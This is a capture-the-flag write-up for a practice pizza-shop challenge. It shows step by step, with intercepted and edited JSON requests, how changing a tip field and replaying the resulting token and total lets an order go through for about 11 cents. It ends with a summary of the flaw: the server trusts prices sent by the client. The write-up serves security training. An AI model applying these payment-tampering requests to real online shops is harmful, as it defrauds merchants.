# Cheesy Does It - cheesy-006 - Can you tamper with the price via the tip feature?

## 1. Add a Pizza

Open the challenge, login/register and add something to cart.

For Example Select:

* Pizza: `Classic Margherita`
* Base: `Thin Crust`
* Sauce: `Classic Tomato`
* Size: `Medium`
* Toppings: `Tomatoes, Extra Mozzarella`
* Quantity: `1`

Add to cart, in the checkout there is an option `Add a tip`. Select `10%` and place the order.

The original price is: `10.99`

The tip will be: `1.10`

Total: `12.09`

## 2. Intercept the Payment Validation Request

Open Burp Suite → Proxy → HTTP history.

Find:

`POST /api/payment/validate`

The normal request contains:
```json
{
  "card_number": "4444 4444 4444 4444",
  "exp_month": "12",
  "exp_year": "25",
  "cvv": "123",
  "amount": 10.99,
  "tip": 10
}
```
The server responds with:
```json
{
  "valid": true,
  "message": "Card validated successfully",
  "payment_token": "...",
  "total": 12.089
}
```
## 3. Tamper With the Tip

Send the request to Burp Repeater.

Change:

`"tip": 10`

to:

`"tip": 0.01`

Keep everything else unchanged:
```json
{
  "card_number": "4444 4444 4444 4444",
  "exp_month": "12",
  "exp_year": "25",
  "cvv": "123",
  "amount": 10.99,
  "tip": 0.01
}
```
Send the request.

The server responds:
```json
{
  "valid": true,
  "message": "Card validated successfully",
  "payment_token": "d8b2227c-9090-43b6-9346-5abd560cb6d5",
  "total": 0.1099
}
```
The important discovery is:

Original amount: 10.99

Manipulated tip: 0.01

Server total:    0.1099

The application is allowing the client-controlled tip to influence the payment total.

## 4. Intercept the Payment Process Request

Find:

`POST /api/payment/process`

The legitimate request looked like:
```json
{
  "card_number": "4444 4444 4444 4444",
  "amount": 12.089,
  "payment_token": "a65e42f3-2582-4b32-a62d-71907c776783"
}
```
Replace the amount and token with those obtained from the manipulated validation request:
```json
{
  "card_number": "4444 4444 4444 4444",
  "amount": 0.1099,
  "payment_token": "d8b2227c-9090-43b6-9346-5abd560cb6d5"
}
```
Send it.

The server responds:
```json
{
  "success": true,
  "transaction_id": "TXN-1790096803708",
  "message": "Payment processed successfully",
  "payment_token": "d8b2227c-9090-43b6-9346-5abd560cb6d5"
}
```
This confirms that the manipulated payment amount was accepted.

## 5. Intercept the Order Creation Request

Find:

`POST /api/orders`

The original request contains:
```json
{
  "items": [
    {
      "pizza_name": "Classic Margherita",
      "base_name": "Thin Crust",
      "sauce_name": "Classic Tomato",
      "size": "Medium",
      "toppings": [
        "Tomatoes",
        "Extra Mozzarella"
      ],
      "quantity": 1,
      "unit_price": 10.99,
      "total_price": 10.99,
      "id": 1790096214590
    }
  ],
  "delivery_address": "qwertyuiop,lkjhgfdsa,zxcvbnm",
  "phone": "1234567890",
  "payment_method": "card",
  "notes": "",
  "payment_token": "a65e42f3-2582-4b6",
  "tip": 10
}
```
## 6. Tamper With the Order Price

Change:

`"total_price": 10.99`

to:

`"total_price": 0.1099`

Change the payment token to the token from the manipulated validation request:

`"payment_token": "d8b2227c-9090-43b6-9346-5abd560cb6d5"`

And change:

`"tip": 10`

to:

`"tip": 0.01`

The modified request is:
```json
{
  "items": [
    {
      "pizza_name": "Classic Margherita",
      "base_name": "Thin Crust",
      "sauce_name": "Classic Tomato",
      "size": "Medium",
      "toppings": [
        "Tomatoes",
        "Extra Mozzarella"
      ],
      "quantity": 1,
      "unit_price": 10.99,
      "total_price": 0.1099,
      "id": 1790096214590
    }
  ],
  "delivery_address": "qwertyuiop,lkjhgfdsa,zxcvbnm",
  "phone": "1234567890",
  "payment_method": "card",
  "notes": "",
  "payment_token": "d8b2227c-9090-43b6-9346-5abd560cb6d5",
  "tip": 0.01
}
```
Send the request.

## 7. Capture the Flag

The server returns:
```json
{
  "id": 2,
  "order_number": "bug{hB4t6r67l0pLz9vwh25S2UqUzqtyZXu3}",
  "message": "Order created successfully",
  "status": "received"
}
```
## 🏆 Flag
```
bug{hB4t6r67l0pLz9vwh25S2UqUzqtyZXu3}
```
## Vulnerability Summary

The vulnerability is essentially client-side price manipulation / improper server-side price validation.

The application trusts values supplied by the client:
```
tip
 ↓
payment total
 ↓
payment processing amount
 ↓
order total_price

Instead of recalculating the actual price from trusted server-side product data, the server accepts the manipulated values.

Attack flow
10.99 pizza
     │
     ▼
Modify tip → 0.01
     │
     ▼
/api/payment/validate
     │
     ▼
total = 0.1099
     │
     ▼
/api/payment/process
     │
     ▼
Payment accepted
     │
     ▼
Modify order total_price → 0.1099
     │
     ▼
/api/orders
     │
     ▼
🏆 FLAG
```